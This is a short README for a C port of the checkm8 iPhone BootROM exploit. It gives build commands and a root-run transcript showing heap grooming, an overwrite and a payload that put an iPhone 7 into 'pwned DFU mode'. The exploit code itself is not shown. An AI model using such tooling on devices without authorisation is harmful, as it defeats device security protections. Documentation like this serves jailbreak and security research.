# checkm8

C version of checkm8 exploit

### Support
This has been tested on an iPhone 7 on a Linux host. Some USB controllers may not work.

### Build
Install libusb and run `make` :
```
λ ~/checkm8(master) » make
gcc -I. -g -Wall -Wextra -c src/checkm8.c -o src/checkm8.o
gcc -I. -g -Wall -Wextra -c src/usbexec.c -o src/usbexec.o
gcc -I. -g -Wall -Wextra -c src/main.c -o src/main.o
gcc src/checkm8.o src/usbexec.o src/main.o -o checkm8 -lusb-1.0
```

### Run
Run checkm8 as root and make sure you are in the root directory of this project. If not, the tool won't find the payloads.

```
λ ~/checkm8(master) » sudo ./checkm8
[i] CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:00XXXXXXXXXXXXXX IBFL:3C SRTG:[iBoot-2696.0.0.1.33]
[i] heap grooming
[i] preparing for overwrite
[i] sending overwrite
[i] sending payload
[i] reseting device...
[i] CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:00XXXXXXXXXXXXXX IBFL:3C SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[+] device is now in pwned DFU mode
```

### Credits
- axi0mx for checkm8 BootROM exploit
- synackuk for some usbexec stuff
- Gregor Haas : A10 payloads

